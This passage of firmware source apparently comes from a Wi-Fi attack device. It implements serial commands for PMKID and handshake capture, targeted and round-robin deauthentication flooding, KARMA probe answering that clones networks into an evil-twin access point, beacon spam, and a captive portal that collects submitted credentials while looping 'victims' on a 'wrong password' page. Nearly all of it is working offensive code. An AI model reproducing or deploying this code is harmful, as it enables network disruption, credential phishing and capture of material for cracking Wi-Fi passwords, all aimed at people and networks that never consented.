      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_pmf_cb, 0);
      for(int i=0;i<secs;i++) delay(1000);
      wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
      pmf_stream(ch);
    }else if(readString.substring(0,5)=="TRACK"){
      // A2: TRACK <chan> [secs] - device timeline for a channel (see promisc_cli_cb).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 30;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 2 || secs > 120) secs = 30;
      if(apActive) destroyAP();
      cli_n = 0;
      cli_on = true;
      cli_base = millis();
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_cli_cb, 0);
      for(int i=0;i<secs;i++) delay(1000);
      wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
      cli_on = false;
      cli_stream(ch);
    }else if(readString.substring(0,7)=="STASCAN"){
      // P4: list stations seen for a BSSID. Args: STASCAN <chan> [secs] [bssid-12hex]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      String bssid_hex = "";
      int secs = 5;
      if (s2 > 0) {
        String a2s = readString.substring(s2+1, s3>0?s3:readString.length()-1);
        if (a2s.length() == 12) {   // 12 hex chars -> BSSID filter, secs becomes 3rd arg
          bssid_hex = a2s;
          secs = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 5;
        } else {
          secs = a2s.toInt();
        }
      }
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 5;
      if(apActive) destroyAP();   // monitor scan needs the softAP torn down
      sta_n = 0;
      sta_filter_on = (bssid_hex.length() == 12);
      for(int i=0; sta_filter_on && i<6; i++)
        sta_filter[i] = (uint8_t)strtoul(bssid_hex.substring(i*2, i*2+2).c_str(), NULL, 16);
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_sta_cb, 0);
      for(int i=0;i<secs;i++) delay(1000);
      wifi_set_promisc(0, NULL, 0);
      sta_stream(ch);
    }else if(readString.substring(0,11)=="PMKIDCLIENT"){
      // P6 clientless: raw-assoc to make the AP replay M1, capture the PMKID.
      // Args: PMKIDCLIENT <chan> <bssid-12hex> <ssid...>
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      String bhex = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("");
      String ssid = (s3 > 0) ? readString.substring(s3+1, readString.length()-1) : String("");
      if(ch < 1 || ch > 165) ch = 6;
      uint8_t bssid[6]; bool ok = (bhex.length() == 12);
      for(int i=0; ok && i<6; i++)
        bssid[i] = (uint8_t)strtoul(bhex.substring(i*2, i*2+2).c_str(), NULL, 16);
      if(!ok || ssid.length() == 0){
        Serial.println("ERR:PMKIDCLIENT:args"); Serial1.println("ERR:PMKIDCLIENT:args");
      }else{
        if(apActive) destroyAP();   // monitor capture needs the softAP torn down
        pmkid_n = 0;
        cl_eapol = 0;
        char macstr[20] = {0};
        wifi_get_mac_address(macstr);
        char ssidbuf[33]; ssid.toCharArray(ssidbuf, sizeof(ssidbuf));
        String r = String("PMKIDCLIENT:assoc sta=") + macstr;
        Serial.println(r); Serial1.println(r);
        pmkid_clientless(ch, bssid, ssidbuf);
        wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_pmkid_cb, 0);
        for(int i=0;i<6;i++){
          delay(1000);
          if(i == 1 || i == 3) pmkid_clientless(ch, bssid, ssidbuf);  // retry assoc
        }
        wifi_set_promisc(0, NULL, 0);
        String d = "PMKIDCLIENT:eapol=" + String((unsigned)cl_eapol);
        Serial.println(d); Serial1.println(d);
        pmkid_stream(ch);
      }
    }else if(readString.substring(0,5)=="PMKID"){
      // P6 passive: extract PMKID from any M1 seen. Args: PMKID <chan> [secs]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 10;
      if(apActive) destroyAP();   // monitor capture needs the softAP torn down
      pmkid_n = 0;
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3, promisc_pmkid_cb, 0);
      for(int i=0;i<secs;i++) delay(1000);
      wifi_set_promisc(0, NULL, 0);
      pmkid_stream(ch);
    }else if(readString.substring(0,6)=="PKGRAB"){
      // P6 active: deauth <bssid> to force a client's M1, then extract PMKID.
      // Args: PKGRAB <chan> <bssid-12hex> [secs]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      String bssid_hex = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("");
      int secs = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 10;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 10;
      uint8_t bssid[6]; bool ok = (bssid_hex.length() == 12);
      for(int i=0; ok && i<6; i++)
        bssid[i] = (uint8_t)strtoul(bssid_hex.substring(i*2, i*2+2).c_str(), NULL, 16);
      if(!ok){
        Serial.println("ERROR: PKGRAB needs <chan> <bssid-12hex> [secs]");
        Serial1.println("ERROR: PKGRAB needs <chan> <bssid-12hex> [secs]");
      }else{
        if(apActive) destroyAP();   // monitor capture needs the softAP torn down
        pmkid_n = 0;
        memcpy(hsg_bssid, bssid, 6);
        hsg_ch = ch;
        hsg_cap_ms = (uint32_t)secs * 1000u;
        hsg_pmkid = true;
        sta_n = 0;
        wext_set_channel(WLAN0_NAME, ch);
        wifi_set_promisc(3, promisc_sta_cb, 0);
        hsg_t = millis();
        hsg_phase = HSG_DISCOVER;  // discover STAs -> unicast deauth -> PMKID capture
        Serial.println("PKGRAB: armed"); Serial1.println("PKGRAB: armed");
      }
    }
    readString="";

  }
  
  // P1: channel hop tick
  if (hopping) {
    static uint32_t last_hop = 0;
    static uint8_t hop_idx = 0;
    if (millis() - last_hop >= hop_interval_ms) {
      last_hop = millis();
      hop_idx = (hop_idx + 1) % (uint8_t)sizeof(hop_channels);
      wext_set_channel(WLAN0_NAME, hop_channels[hop_idx]);
      digitalWrite(LED_G, !digitalRead(LED_G));
    }
  }

  // B: async passive CAPTURE deadline (loop() finishes it; CAPSTOP aborts early)
  if (cap_active && millis() >= cap_deadline) {
    wifi_set_promisc(0, NULL, 0);
    hs_cap = false;
    cap_active = false;
    hs_stream(cap_ch);
  }

  // HSGRAB/PKGRAB: discover STAs -> unicast deauth -> promisc capture.
  if (hsg_phase == HSG_DISCOVER) {
    if (millis() - hsg_t >= hsg_disc_ms) {
      wifi_set_promisc(0, NULL, 0);
      hsg_phase = HSG_DEAUTH;
      hsg_t = millis();
    }
  } else if (hsg_phase == HSG_DEAUTH) {
    wext_set_channel(WLAN0_NAME, hsg_ch);
    if (!is_dfs_channel(hsg_ch)) {   // DFS: RX-only
      for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
        wifi_tx_deauth_frame(hsg_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
        delay(5);
      }
      // Unicast both directions to each discovered STA — broadcast deauth is often ignored.
      uint8_t sn = sta_n;
      for (uint8_t k = 0; k < sn && k < 8; k++) {
        wifi_tx_deauth_frame(hsg_bssid, (void *)sta_list[k].mac, 6);   // AP -> STA
        delay(5);
        wifi_tx_deauth_frame((void *)sta_list[k].mac, hsg_bssid, 6);   // STA -> AP
        delay(5);
      }
    }
    if (millis() - hsg_t >= hsg_deauth_ms) {
      if (hsg_pmkid) wifi_set_promisc(3, promisc_pmkid_cb, 0);
      else { hs_cap = true; wifi_set_promisc(3, promisc_spike_cb, 0); }
      hsg_phase = HSG_CAPTURE;
      hsg_t = millis();
    } else {
      delay(50);
    }
  } else if (hsg_phase == HSG_CAPTURE) {
    if (millis() - hsg_t >= hsg_cap_ms) {
      wifi_set_promisc(0, NULL, 0);
      hs_cap = false;
      if (hsg_pmkid) pmkid_stream(hsg_ch);
      else hs_stream(hsg_ch);
      hsg_phase = HSG_IDLE;
    }
  }

  // C: multi-target deauth round-robin (DEAUTHADD/DEAUTHRUN)
  if (dauth_run && dauth_n > 0) {
    dauth_t* t = &dauth_list[dauth_idx];
    static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    wext_set_channel(WLAN0_NAME, t->ch);
    if (!is_dfs_channel(t->ch)) {   // DFS: RX-only
      const uint8_t* dst = t->have_client ? t->client : bcast;
      digitalWrite(LED_R, HIGH);
      for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
        wifi_tx_deauth_frame(t->bssid, (void *)dst, deauth_reason);
        delay(5);
      }
      digitalWrite(LED_R, LOW);
    }
    dauth_idx = (dauth_idx + 1) % dauth_n;
    delay(50);
  }

  if (deauth_wifis.size() > 0) {
    memcpy(deauth_bssid, scan_results[deauth_wifis[current_num]].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[deauth_wifis[current_num]].channel);
    current_num++;
    if (current_num >= deauth_wifis.size()) current_num = 0;
    digitalWrite(LED_R, HIGH);
    for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      delay(5);
    }
    digitalWrite(LED_R, LOW);
    delay(50);
  }

  // B1/C1: answer a caught probe request (deferred out of the promisc callback).
  if(karma_on && karma_pending) {
    karma_pending = false;
    if(karma_ssid[0]) {
      if(trap_on && trap_armed) {
        // C1: become that network for real, then let the portal do the work.
        trap_armed = false;
        strncpy(trap_ssid, karma_ssid, 32);
        trap_ssid[32] = 0;
        if(apActive) destroyAP();
        // The driver cannot sniff and run a softAP at once: stop promisc first or apbegin fails.
        wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
        karma_on = false;
        snprintf(ap_channel, sizeof(ap_channel), "%d", karma_chan);
        secured = false;
        build_portal_urls(trap_ssid);
        createAP(trap_ssid, ap_channel);   // sets apActive itself, and now bails out on failure
        if(apActive) {
          String t = String("TRAP:") + trap_ssid;
          Serial.println(t); Serial1.println(t);
        } else {
          // Could not clone it - go back to plain KARMA so probes still get answered.
          trap_armed = true;
          karma_on = true;
          wext_set_channel(WLAN0_NAME, karma_chan);
          wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_karma_cb, 0);
          Serial.println("TRAPFAIL"); Serial1.println("TRAPFAIL");
        }
      }
      if(karma_on && !apActive) karma_respond(karma_ssid, karma_client, karma_chan);
    }
  }

  if (randomSSID){
    digitalWrite(LED_G, !digitalRead(LED_G));
    int randomIndex = random(0, 10);
    int randomChannel = allChannels[randomIndex];
    String ssid2 = generateRandomString(10);
    for(int i=0;i<6;i++){
      byte randomByte = random(0x00, 0xFF);
      snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
    }
    
    const char * ssid_cstr2 = ssid2.c_str();
    wext_set_channel(WLAN0_NAME,randomChannel);
    for(int x=0;x<5;x++){
      tx_beacon_raw((const uint8_t*)randomString, TX_BCAST, ssid_cstr2, 0x80, randomChannel);
    }
  }
  if (rickroll){
    digitalWrite(LED_G, !digitalRead(LED_G));
    for (int v = 0; v < 8; v++){   // FIX: was `for (int v; ...)` — v uninitialized (UB)
      String ssid2 = rick_roll[v];
      for(int i=0;i<7;i++){
        byte randomByte = random(0x00, 0xFF);
        snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
      } 
    
      const char * ssid_cstr2 = ssid2.c_str();
      wext_set_channel(WLAN0_NAME,v+1);
      for(int x=0;x<5;x++){
       tx_beacon_raw((const uint8_t*)randomString, TX_BCAST, ssid_cstr2, 0x80, v+1);
      }
    }
  }
  if (ghostSpam){
    digitalWrite(LED_G, !digitalRead(LED_G));
    for (int v = 0; v < 8; v++){
      const char * ssid_cstr2 = ghost_ssids[v];
      wext_set_channel(WLAN0_NAME, v+1);
      for(int x=0;x<5;x++){
        tx_beacon_raw((const uint8_t*)"\x00\xE0\x4C\x01\x02\x03", TX_BCAST, ssid_cstr2, 0x80, v+1);
      }
    }
  }
  if(ssid!=""){
    int channel = 5;
    digitalWrite(LED_G, !digitalRead(LED_G));
    wext_set_channel(WLAN0_NAME,channel);
    const char * ssid_cstr2 = ssid.c_str();
    // Print once per SSID, not once per beacon: this runs every loop() pass (~150+/s), which
    // flooded the USB log and made the out-of-band control channel unusable while beaconing.
    static char last_ssid[33] = {0};
    if(strcmp(last_ssid, ssid_cstr2) != 0) {
      strncpy(last_ssid, ssid_cstr2, 32);
      last_ssid[32] = '\0';
      DEBUG_SER_PRINT("START "+ssid);
    }
    for(int x=0; x<5; x++){
      tx_beacon_raw((const uint8_t*)"\x00\xE0\x4C\x01\x02\x03", TX_BCAST, ssid_cstr2, 0x80, channel);
    }

  }
  
  if (apActive) {
    // Poll the listen socket at most every 20 ms. loop() runs thousands of times a second, and
    // calling server.available() (accept) that often makes the SDK spew
    // "[ERROR] Accept connection failed" non-stop and burns CPU while barely helping latency.
    static uint32_t last_accept_ms = 0;
    uint32_t now_ms = millis();
    bool poll_ok = (now_ms - last_accept_ms) >= 20;
    if(poll_ok) last_accept_ms = now_ms;
    WiFiClient client = poll_ok ? server.available() : WiFiClient();
    if (client) {
      //client.setRecvTimeout(500);
      String request;
      request.reserve(256);  // Reservamos memoria para evitar fragmentación
      /*
      struct tcp_pcb *tcp;
      for (tcp = tcp_tw_pcbs; tcp != NULL; tcp = tcp->next) {
        if (tcp->local_port == 80) tcp->local_port = localPortNew++;
        tcp_close(tcp);
      }
      */

      while (client.connected()) {
        if (client.available()) {
          char character = client.read();
          if (character == '\n') {
            while(client.available()){
            character=client.read();
            client.clearWriteError();
            
            delay(1);
            }
            String path = parseRequest(request);
            Serial.println(request);
            uint32_t cip = (uint32_t)client.remoteIP();
            bool authed = ip_is_authed(cip);
            Serial.print("CIP="); Serial.print(cip, HEX); Serial.print(" authed="); Serial.println(authed);
            // RFC 8908 Captive-Portal API endpoint that DHCP option 114 points at.
            // Android's NetworkMonitor fetches this expecting application/captive+json.
            // Report captive:false once this client is authorized so the OS clears the warning.
            if(path.startsWith("/cp.json")){
              String j = String("{\"captive\":") + (authed ? "false" : "true") + ",\"user-portal-url\":\"" + String(portalUrl) + "\"}";
              String resp = makeResponse(200, "application/captive+json", false, j.length());
              resp += j;
              client.write(resp.c_str());
            }else
            // Portal page + form submissions get the HTML; every captive probe
            // (generate_204, ncsi.txt, success.html, …) and any unknown URL gets a
            // 302 to the portal root, which is what triggers the Android/iOS sign-in flow.
            if(path.equals("/")||path.startsWith("/?")||path.startsWith("/login")||path.startsWith("/get")||path.startsWith("/userinput")){
              if (deauth_wifis.size() != 0)
                handleRequest(client, (enum portals)portal, scan_results[deauth_wifis[0]].ssid);
              else
                handleRequest(client, (enum portals)portal, "router");
              if (path.indexOf('?') >= 0 && (path.indexOf('=') > path.indexOf('?'))) {
                String datos = path.substring(path.indexOf('?') + 1);
                if (datos.length() > 0) {
                  Serial1.print("EV:");
                  Serial1.println(datos);
                  // C2: advance to the next built-in portal for the next victim.
                  if (portal_rot) portal = (portal + 1) % 6;
                  // Portal pages now loop the victim ("wrong password"), so we keep the
                  // network captive and never validate (no 204) -> the sign-in keeps
                  // coming back. Re-enable the line below to instead clear the OS
                  // "no internet" warning after a capture (that also makes the
                  // handle204()/authed_ips path live again):
                  // ip_mark_authed(cip);   // <- 204 path: mark this client authed after creds
                }
              }
          }else{
            // Probe / unknown URL: authorized client -> 204 (clears warning); else 302 to portal.
            if(authed) handle204(client); else handleRedirect(client);
          }
          break;

          }else if(character == '%'){
            char buff[2] ;
            client.read(buff,2);
            char value = (char)strtol(buff, NULL, 16);
            if(value <= 127){
              character = value;
            }else{
              request += "%";
              request += buff[0];
              request += buff[1];
            }

          } 
          request += character;

          
          delay(10);
        }
      }
      

      // Opcional: forzar limpieza de conexiones TIME-WAIT (solo si es necesario)
      /*
      struct tcp_pcb *tcp;
      for (tcp = tcp_tw_pcbs; tcp != NULL; tcp = tcp->next) {
        if (tcp->local_port == 80) tcp->local_port = localPortNew++;
        tcp_close(tcp);
      }
      */

      

      delay(50);  // menor delay, no saturar
      client.stop();

    }
  }
  
}